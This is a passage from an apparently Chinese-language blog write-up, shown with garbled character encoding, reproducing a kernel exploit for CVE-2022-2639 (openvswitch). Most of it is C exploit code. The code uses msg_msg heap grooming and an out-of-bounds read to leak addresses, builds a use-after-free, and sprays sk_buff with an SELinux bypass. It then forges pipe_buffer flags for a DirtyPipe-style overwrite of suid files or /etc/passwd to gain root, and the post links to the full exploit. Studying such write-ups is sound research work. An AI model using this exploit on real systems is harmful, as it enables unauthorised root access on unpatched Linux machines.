<p>æ­¤æ—¶å¤§æ¦‚å †å¸ƒå±€ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-5.png"></p>
<p><code>MTYPE_B | (j &lt;&lt; 8)</code> çš„ç›®çš„æ˜¯åé¢ä¸ºäº†ç¡®å®šè¶Šç•Œè¯»åˆ°çš„ <code>msg_msg</code> æ˜¯ç¬¬ä¸€æ¡æ¶ˆæ¯è¿˜æ˜¯åé¢çš„æ¶ˆæ¯ï¼Œæ¥å†³å®šè¯»å– <code>m_next</code> æŒ‡é’ˆè¿˜æ˜¯ <code>m_prev</code> æŒ‡é’ˆã€‚</p>
<p>è§¦å‘æ¼æ´è¶Šç•Œè¦†å†™çš„æ•°æ®å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> vuln_buf[] = &#123;</span><br><span class="line">    <span class="number">0</span>,                                     <span class="comment">// m_list.next</span></span><br><span class="line">    <span class="number">0</span>,                                     <span class="comment">// m_list.prev</span></span><br><span class="line">    MTYPE_A,                               <span class="comment">// m_type</span></span><br><span class="line">    MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="comment">// m_ts</span></span><br><span class="line">&#125;;</span><br><span class="line">trigger_vuln(&amp;vuln_buf, <span class="keyword">sizeof</span>(vuln_buf));</span><br></pre></td></tr></table></figure>

<p><code>m_ts</code> è¦†å†™ä¸ºå¤šè¯»ä¸€ä¸ª <code>msg_msgseg</code> çš„å¤§å°ã€‚</p>
<p>å‡è®¾æ­¤æ—¶å ä½æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ¬¡åˆ©ç”¨ <text style="color:green">msg1</text> è¶Šç•Œè¯»å–çš„æ—¶å€™ï¼Œå°±ä¼šè¯»åˆ° msgB çš„ <code>m_next</code> æŒ‡é’ˆï¼Œä»è€Œ<strong>å¾—åˆ° <text style="color:red">msgC</text> çš„åœ°å€</strong>ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-6.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> copy_size = msgrcv(list1_corrupted_msqid, msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line"><span class="keyword">if</span> ((copy_size &lt; <span class="number">0</span>) || (copy_size != MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>))) </span><br><span class="line">    die(<span class="string">&quot;[-] recv from corrupted msg_msg failed&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *oob_data = (<span class="type">uint64_t</span> *)(msg_a_oob-&gt;mtext + MSG_A_TEXT_SIZE);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> msg_msg *)oob_data;</span><br><span class="line"><span class="keyword">if</span> (((<span class="type">int</span> *)&amp;p-&gt;mtext)[<span class="number">0</span>] != MSG_SIG) &#123;</span><br><span class="line">    loge(<span class="string">&quot;[-] bad luck, we don&#x27;t catch 0x400 msg_msg&quot;</span>);</span><br><span class="line">    clean_msq2();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">logd(<span class="string">&quot;[+] it works :)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// list2_leak_msqid â€”â€” the msg_msg with kmalloc-0x400 address</span></span><br><span class="line">list2_leak_msqid = msqid_2[((<span class="type">int</span> *)&amp;p-&gt;mtext)[<span class="number">1</span>]];</span><br><span class="line">list2_leak_mtype = p-&gt;m_type;</span><br><span class="line">list2_leak_security = p-&gt;security;</span><br><span class="line"><span class="keyword">if</span> (list2_leak_mtype &gt; <span class="number">0x100</span>) &#123;</span><br><span class="line">    list2_uaf_msg_addr = p-&gt;m_list.prev;</span><br><span class="line">    list2_uaf_mtype = p-&gt;m_type - <span class="number">0x100</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    list2_uaf_msg_addr = p-&gt;m_list.next; <span class="comment">// first msg_msg</span></span><br><span class="line">    list2_uaf_mtype = p-&gt;m_type + <span class="number">0x100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-10] free all uncorrupted msg_msg ...&quot;</span>);</span><br><span class="line">clean_msq2();</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-7.png"></p>
<p>æ­¤æ—¶å¾—åˆ°äº†ä¸€ä¸ª 0x400 çš„ slab çš„åœ°å€ã€‚å¹¶ä¸”ç”±äºä¸Šè¿°æ”»å‡»å®Œæˆåå°† <code>msqid1ã€msqid2</code> ä¸­é™¤äº†ä¸¤ä¸ªç”¨åˆ°çš„ <code>msg_msg</code> éƒ½é‡Šæ”¾æ‰äº†ï¼Œå¾ˆå¤š slab éƒ½ä¼šé‡æ–°å›åˆ° freelist å¹¶ä¸”éƒ¨åˆ†ä¼šå‘ç”Ÿå‘ä¸Šåˆå¹¶çš„æƒ…å†µã€‚<strong>æ­¤æ—¶ä¸¤ä¸ªè¿˜åœ¨ç”¨åˆ°çš„åˆ†åˆ«æ˜¯ä¸€ä¸ªè¢«ç¯¡æ”¹äº† <code>m_ts</code> çš„ <text style="color:green">msg1</text> å’Œæœ‰0x10ä¸ª <code>msg_msg</code> æ¶ˆæ¯çš„é˜Ÿåˆ— <code>list2_leak_msqid</code>ï¼Œè¶Šç•Œç›´æ¥è¯»çš„ msgB å’Œæ‹¿åˆ°åœ°å€çš„ <text style="color:red">msgC</text> éƒ½å±äºè¯¥é˜Ÿåˆ—ã€‚</strong></p>
<h2 id="exploit-2ï¼šæ„é€ -DirtyPipe"><a href="#exploit-2ï¼šæ„é€ -DirtyPipe" class="headerlink" title="exploit-2ï¼šæ„é€  DirtyPipe"></a>exploit-2ï¼šæ„é€  DirtyPipe</h2><p>æ‹¿åˆ°ä¸€ä¸ªæ­£åœ¨ä½¿ç”¨çš„ <code>msg_msg</code> å †åœ°å€ï¼Œè€ƒè™‘åˆ¶é€  UAFã€‚å‰é¢å‡ æ­¥ä¸ exploit-1 çš„å‰å‡ æ­¥ä¸€æ ·ï¼Œç›´åˆ°è§¦å‘æ¼æ´æ—¶ï¼Œç›´æ¥æº¢å‡ºè¦†å†™ <code>struct msg_msg</code> çš„ <code>m_next</code> æŒ‡é’ˆä¸ºåˆšæ‰å¾—åˆ°æ­£åœ¨ç”¨çš„ 0x400 çš„ <code>struct msg_msg</code> å³ <text style="color:red">msgC</text>ï¼Œæš‚ä¸”ç§°è¢«æº¢å‡ºè¦†å†™çš„<code>struct msg_msg</code>ä¸º msgAï¼Œæ­¤æ—¶çš„ <code>msg_msg</code> å…³ç³»å¦‚å›¾ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-8.png"></p>
<p>æ­¤æ—¶ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å—å†…å­˜ã€‚uaf å·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ã€‚</p>
<p>æ¥ä¸‹æ¥å…ˆé‡Šæ”¾æ‰åœ¨ exploit-1 ä¸­ä¿ç•™çš„ <code>list2_leak_msqid</code> ï¼ŒmsgB å’Œ <text style="color:red">msgC</text> æ‰€åœ¨çš„é“¾å¹¶æœªè¢«ç ´åï¼Œunlink ä¸€åˆ‡æ­£å¸¸ï¼Œæ­¤æ—¶ msgA çš„ <code>m_next</code> æŒ‡å‘äº†ä¸€å—å·²ç»é‡Šæ”¾çš„å†…å­˜ã€‚<strong>å¾—åˆ°äº†ä¸€ä¸ª 0x400 slab çš„ UAFã€‚</strong>æ­¤æ—¶å¸ƒå±€å¤§æ¦‚å¦‚ä¸‹ï¼ˆBæ­¤æ—¶ä¹Ÿæ˜¯ freed çš„çŠ¶æ€äº†ï¼‰ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-9.png"></p>
<p>ç„¶å spray sk_buffï¼ˆæœ¬æ–‡ä¸­ä½¿ç”¨çš„ç»“æ„åœ¨<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#">arttnba3 å¸ˆå‚…çš„åšå®¢</a>ä¸­éƒ½æœ‰è¯¦ç»†è¯´æ˜ï¼‰ï¼Œå¤§æ¦‚ç‡ä¼šæœ‰ä¸€ä¸ªæˆåŠŸå ç”¨ <text style="color:red">msgC</text> çš„ slabã€‚ç”±äº sk_buff-&gt;data ç»“æ„ä½“å‰é¢çš„æ•°æ®å‡å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ªåˆæ³•çš„ msg header ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="keyword">sizeof</span>(buff));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> msg_msg *)buff;</span><br><span class="line">p-&gt;m_list.next = list2_uaf_msg_addr;</span><br><span class="line">p-&gt;m_list.prev = list2_uaf_msg_addr;</span><br><span class="line">p-&gt;m_ts = <span class="number">0x100</span>;</span><br><span class="line">p-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">p-&gt;next = <span class="number">0</span>;</span><br><span class="line">p-&gt;security = list2_leak_security; <span class="comment">// bypass selinux</span></span><br><span class="line">spray_skbuff_data(buff, <span class="number">0x400</span> - <span class="number">0x140</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-10.png"></p>
<p>æ­¤æ—¶æˆ‘ä»¬å†é€šè¿‡ msgA æ‰€åœ¨é˜Ÿåˆ—å°† sk_buff-&gt;data æ‰€åœ¨çš„ slab é‡Šæ”¾ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ª sk_buff-&gt;data çš„ UAFï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-8] free sk_buff-&gt;data using fake msqid&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid_1[i], msg_b, MSG_B_TEXT_SIZE, MTYPE_FAKE, IPC_NOWAIT) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        logd(<span class="string">&quot;[+] freed using msqid %d&quot;</span>, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-11.png"></p>
<p>ç„¶åå†å †å–· <code>struct pipe_buffer</code>ï¼Œç”±äºåˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ï¼ˆ0x400ï¼‰ä¸­å–å‡ºä¸€ä¸ª objectã€‚æ­¤æ—¶å¤§æ¦‚ç‡ä¼š<strong>æœ‰è¿ç»­çš„ <code>pipe buffer</code> å’Œ sk_buff-&gt;data å…±ç”¨ä¸€ä¸ªslab</strong>ã€‚åŒæ—¶æ“ä½œpipeï¼Œæ‰“å¼€ç›®æ ‡ suid æ–‡ä»¶ï¼Œå¹¶åšå¥½ splice æ“ä½œï¼š</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-9] spray 0x100 pipe_buffer to re-acquire the 0x400 slab freed by sk_buff-&gt;data&quot;</span>);</span><br><span class="line"><span class="type">int</span> attack_fd = open(ATTACK_FILE, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (attack_fd &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] open %s: %m&quot;</span>, ATTACK_FILE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipes[i])) die(<span class="string">&quot;[-] alloc pipe failed.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], buff, <span class="number">0x100</span> + i);</span><br><span class="line"></span><br><span class="line">    <span class="type">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = splice(attack_fd, &amp;offset, pipes[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] splice() failed.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-12.png"></p>
<p>æ­¤æ—¶å†<strong>æ²¿ç€å‘é€çš„è·¯å¾„æ¥æ”¶è¯¥åŒ…å°±èƒ½å°† sk_buff-&gt;data é‡Šæ”¾æ‰ï¼ŒåŒæ—¶æ³„éœ²äº†æ•´ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“</strong>ï¼Œæ­¤æ—¶å°±ä» sk_buff-&gt;data çš„ UAF è½¬åŒ–ä¸º <code>pipe_buffer</code> çš„ UAFï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-10] free sk_buff-&gt;data to make pipe_buffer become UAF&quot;</span>);</span><br><span class="line"><span class="type">int</span> uaf_pipe_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">char</span> pipe_buffer_backup[<span class="number">0x280</span>];</span><br><span class="line"><span class="type">int</span> PIPE_BUF_FLAG_CAN_MERGE = <span class="number">0x10</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">typ_pipe_buffer</span> *<span class="title">ptr</span> =</span> (<span class="keyword">struct</span> typ_pipe_buffer *)buff;</span><br><span class="line">    <span class="type">uint64_t</span> size = <span class="number">0x400</span> - <span class="number">0x140</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sock_pairs[i][<span class="number">1</span>], ptr, size) &lt; <span class="number">0</span>)</span><br><span class="line">                die(<span class="string">&quot;[-] read from sock pairs failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ptr[<span class="number">1</span>].len == <span class="number">1</span> &amp;&amp; ptr[<span class="number">1</span>].offset == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(pipe_buffer_backup, ptr, <span class="keyword">sizeof</span>(pipe_buffer_backup));</span><br><span class="line">                uaf_pipe_idx = ptr[<span class="number">0</span>].len &amp; <span class="number">0xff</span>;</span><br><span class="line">                logi(<span class="string">&quot;[+] uaf_pipe_idx: %d&quot;</span>, uaf_pipe_idx);</span><br><span class="line">                <span class="keyword">goto</span> out1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äºåœ¨å‘é€çš„æ—¶å€™ <code>write(pipes[i][1], buff, 0x100 + i)</code>ï¼Œå†™åœ¨äº†æ¯ä¸ª<code>pipe</code>çš„ç¬¬ä¸€ä¸ª <code>pipe_buffer</code>çš„ page ä¸­ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ª<code>pipe_buffer</code> çš„ <code>len</code> å³ä¸º  0x100 + iï¼Œé‚£ä¹ˆ &amp; 0xff å°±èƒ½å¾—åˆ°æ˜¯å“ªä¸ª <code>pipe</code> äº†ã€‚<code>ptr[1].len == 1 &amp;&amp; ptr[1].offset == 1</code> åˆ™æ˜¯å› ä¸ºå‰é¢çš„ <code>splice()</code> å†™åœ¨ç¬¬äºŒä¸ª <code>pipe_buffer</code> çš„ä¸­ï¼Œå…¶ page æŒ‡å‘äº† page_cacheï¼Œ<code>len</code> å’Œ <code>offset</code> éƒ½æ˜¯ <code>splice()</code> ä¼ å…¥çš„å‚æ•°æŒ‡å®šã€‚</p>
<p><img src="/img/CVE-2022-2639/2-13.png"></p>
<h2 id="exploit-3ï¼šæƒé™æå‡"><a href="#exploit-3ï¼šæƒé™æå‡" class="headerlink" title="exploit-3ï¼šæƒé™æå‡"></a>exploit-3ï¼šæƒé™æå‡</h2><p>åˆ°æ­¤æ—¶ä¸ºæ­¢ï¼Œ<strong>æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ª <code>pipe_buffer</code> çš„ UAF</strong>ã€‚ä¸ç”¨æ³„éœ² <code>ops</code> å­—æ®µå®Œæˆä¼ ç»Ÿçš„ ROPï¼Œç›´æ¥ä¿®æ”¹ flagsï¼è½¬åŒ–ä¸ºç±»ä¼¼ DirtyPipe çš„åœºæ™¯ã€‚<strong>è‡ªä»DirtyPipeè¢«ä¿®å¤åï¼Œä½¿ç”¨ <code>splice()</code> æ—¶flagsä¼šè¢«é‡æ–°è®¾ç½®ä¸º0ï¼Œè€Œæˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯å°†è¿™ä¸ª flags å†æ¬¡ä¿®æ”¹ä¸º <code>PIPE_BUF_FLAG_CAN_MERGE</code>ã€‚</strong>ä»è€Œå®Œæˆä»»æ„æ–‡ä»¶ä¿®æ”¹ï¼Œè¾¾åˆ°æƒé™æå‡çš„ç›®çš„ã€‚è¿™ä¸€æ­¥è¿˜æ˜¯ spray sk_buffï¼ˆä»å¤´å¼€å§‹å°±å¯ä»¥ fake ç®€ç›´ä¸è¦å¤ªå¥½ç”¨ï¼ï¼‰ï¼Œå¤§æ¦‚ç‡å…¶ä¸­ä¸€ä¸ªä¼šå ç”¨è¿™ä¸ª<code>pipe</code> çš„ <code>pipe_buffer</code>ï¼Œä¿®æ”¹ flagsï¼Œlenã€offsetï¼ˆä¸ºäº†å®Œæˆä»å¤´å†™ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="keyword">sizeof</span>(buff));</span><br><span class="line"><span class="built_in">memcpy</span>(buff, pipe_buffer_backup, <span class="keyword">sizeof</span>(pipe_buffer_backup));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">typ_pipe_buffer</span> *<span class="title">ptr</span> =</span> (<span class="keyword">struct</span> typ_pipe_buffer *)buff;</span><br><span class="line">ptr[<span class="number">1</span>].flags = PIPE_BUF_FLAG_CAN_MERGE; <span class="comment">// for kernel &gt;= 5.8</span></span><br><span class="line">ptr[<span class="number">1</span>].len = <span class="number">0</span>;</span><br><span class="line">ptr[<span class="number">1</span>].offset = <span class="number">0</span>;                      <span class="comment">// offset = 0</span></span><br><span class="line">ptr[<span class="number">1</span>].ops = ptr[<span class="number">0</span>].ops;                <span class="comment">// for kernel &lt; 5.8</span></span><br><span class="line">spray_skbuff_data(buff, <span class="number">0x400</span> - <span class="number">0x140</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å…·ä½“å¯ä»¥å‚è€ƒ <a href="https://github.com/veritas501/pipe-primitive">https://github.com/veritas501/pipe-primitive</a></p>
<p>åœ¨ kernel &gt;&#x3D; 5.8 ä¸­éœ€è¦ä¿®æ”¹ pipe buffer ä¸­ splice é¡µçš„flag |&#x3D; PIPE_BUF_FLAG_CAN_MERGEå³å¯ï¼ˆæœ‰èƒ½åŠ›å¯ä»¥é¡ºä¾¿æŠŠoffsetå’Œlenæ”¹æˆ0ï¼Œè¿™æ ·å°±èƒ½ä»æ–‡ä»¶çš„å¼€å¤´å¼€å§‹å†™ï¼‰ï¼›åœ¨ kernel &lt; 5.8 ä¸­ï¼Œéœ€è¦å…ˆleakä¸€ä¸‹pipe_bufferä¸­çš„anon_pipe_opsï¼Œç„¶åå°† splice é¡µçš„çš„opsæ”¹ä¸ºanon_pipe_opsï¼ˆå› ä¸º&lt;5.8ç‰ˆæœ¬ä¸­èƒ½å¦mergeæ˜¯çœ‹opsçš„ï¼‰ï¼ˆæœ‰èƒ½åŠ›ä¾ç„¶å¯ä»¥é¡ºä¾¿æŠŠoffsetå’Œlenæ”¹æˆ0ï¼‰ã€‚</p>
<p>â€”-æ‘˜è‡ª <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">veritas501 åšå®¢</a></p>
</blockquote>
<p><img src="/img/CVE-2022-2639/2-14.png"></p>
<p>ä¸‹æ¬¡å¯¹ pipe å†™å…¥å°±ä¼šä¿®æ”¹æ–‡ä»¶çš„ page cacheï¼Œå¾—åˆ°å’Œ DirtyPipe ä¸€æ ·ä»»æ„æ–‡ä»¶å†™çš„èƒ½åŠ›ï¼å¯¹æœ¬åœ°ææƒæ¥è¯´åªè¦ä¿®æ”¹ suid ç¨‹åºçš„å†…å®¹æˆ–æ˜¯ä¿®æ”¹ &#x2F;etc&#x2F;passwd å³å¯ã€‚å‘ç›®æ ‡æ–‡ä»¶ä¸­å†™å…¥ attack_dataï¼Œå¹¶æ£€æŸ¥æ˜¯å¦æˆåŠŸå†™å…¥ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-12] try to overwrite %s&quot;</span>, ATTACK_FILE);</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = write(pipes[uaf_pipe_idx][<span class="number">1</span>], attack_data, <span class="keyword">sizeof</span>(attack_data));</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] write failed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">size_t</span>)nbytes &lt; <span class="keyword">sizeof</span>(attack_data)) die(<span class="string">&quot;[-] short write&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[*] see if %s changed ...&quot;</span>, ATTACK_FILE);</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(ATTACK_FILE, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] open attack file&quot;</span>);</span><br><span class="line">    <span class="type">char</span> tmp_buffer[<span class="number">0x10</span>];</span><br><span class="line">    read(fd, tmp_buffer, <span class="number">0x10</span>);</span><br><span class="line">    <span class="type">uint32_t</span> *ptr = (<span class="type">uint32_t</span> *)(tmp_buffer + <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">if</span> (ptr[<span class="number">0</span>] != <span class="number">0x56565656</span>)</span><br><span class="line">        die(<span class="string">&quot;[-] overwrite attack file failed: 0x%08x&quot;</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/res.png"></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>é€šè¿‡é¡µé£æ°´åˆ°ä¸€æ­¥ä¸€æ­¥è·å¾— UAF åˆ°æœ€ååˆ›é€ äº† DirtyPipe çš„æ¡ä»¶å®Œæˆä»»æ„æ–‡ä»¶å†™ï¼Œæ— éœ€æ³„éœ²å†…æ ¸åŸºå€å°±å®Œæˆäº†ææƒï¼Œä¸ºå…¶ä»–ç›´æ¥æˆ–è€…é€šè¿‡è½¬åŒ–èƒ½è·å¾—ç±»ä¼¼æ¡ä»¶çš„æ¼æ´åˆ©ç”¨æä¾›äº†æ–°æ€è·¯ã€‚</p>
<p>exp å¯è§ <a href="https://github.com/cxxz16/kernel_study/tree/main/cve-2022-2639">kernel_study&#x2F;cve-2022-2639 at main Â· cxxz16&#x2F;kernel_study (github.com)</a></p>
<p>ç¼–è¯‘å¥½çš„å†…æ ¸ã€æ–‡ä»¶ç³»ç»Ÿå’Œexpç­‰æ–‡ä»¶å¯è§ <a href="https://github.com/bsauce/kernel-exploit-factory">bsauce-exploitåŠæµ‹è¯•ç¯å¢ƒä¸‹è½½åœ°å€</a></p>
<p>æ–‡ç« ä¸­å¦‚æœä»»ä½•é”™è¯¯æˆ–ç–‘é—®ï¼Œæœ›å„ä½è¯»è€…ä¸åèµæ•™ï¼ŒåŠæ—¶æŒ‡æ­£ï¼Œéå¸¸æ„Ÿè°¢ã€‚æœŸå¾…ä¸å¤§å®¶å…±åŒäº¤æµè¿›æ­¥ã€‚</p>
<h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><ol>
<li><a href="https://bsauce.github.io/2022/07/16/CVE-2022-1015/#3-4-%E9%80%9A%E8%BF%87netlink%E4%B8%8Enftables-%E4%BA%A4%E4%BA%92">bsauce CVE-2022-1015</a></li>
<li><a href="https://bsauce.github.io/2022/11/24/CVE-2022-2639/">bsauce CVE-2022-2639</a></li>
<li><a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2022-2639 openvswitch LPE æ¼æ´åˆ†æ</a></li>
</ol>
]]></content>
      <categories>
        <category>cve å¤ç°</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
      </tags>
  </entry>
</search>
